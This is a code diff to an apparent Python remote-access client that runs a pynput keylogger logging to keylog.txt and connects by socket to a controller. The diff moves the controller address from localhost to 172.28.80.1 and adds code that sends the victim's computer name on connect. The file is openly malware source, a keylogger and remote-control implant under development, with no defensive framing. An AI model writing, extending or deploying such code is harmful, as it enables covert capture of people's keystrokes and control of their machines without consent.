@@ -1,11 +1,13 @@
+import os
 import socket
 import subprocess
 import threading
 from pynput import keyboard
 import pyautogui
 import io
+import platform
 
-ip_address = '127.0.0.1'
+ip_address = '172.28.80.1'
 port_number = 1234
 keylog_file = "keylog.txt"
 
@@ -40,6 +42,12 @@ def start_keylogger():
 def connect_to_server():
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cs.connect((ip_address, port_number))
+
+    try:
+        client_id = f"{os.getenv('COMPUTERNAME') or platform.node()}"
+        cs.send(client_id.encode())
+    except Exception as e:
+        cs.send(f"Unknown_Client_{e}".encode())
 
     threading.Thread(target=start_keylogger, daemon=True).start()
 
